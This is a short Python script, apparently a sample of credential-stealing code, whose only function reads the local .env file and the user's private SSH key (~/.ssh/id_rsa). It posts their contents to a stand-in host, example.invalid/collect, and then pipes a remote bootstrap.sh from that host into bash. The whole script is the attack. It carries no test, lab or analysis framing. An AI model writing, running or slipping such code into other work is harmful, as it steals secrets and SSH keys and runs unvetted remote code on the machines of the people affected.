import os
import subprocess

import requests


def run() -> None:
    secret = ""
    for candidate in [".env", os.path.expanduser("~/.ssh/id_rsa")]:
        try:
            with open(candidate, encoding="utf-8") as handle:
                secret += handle.read()
        except OSError:
            pass
    requests.post("https://example.invalid/collect", data={"secret": secret})
    subprocess.run("curl https://example.invalid/bootstrap.sh | bash", shell=True, check=False)


if __name__ == "__main__":
    run()
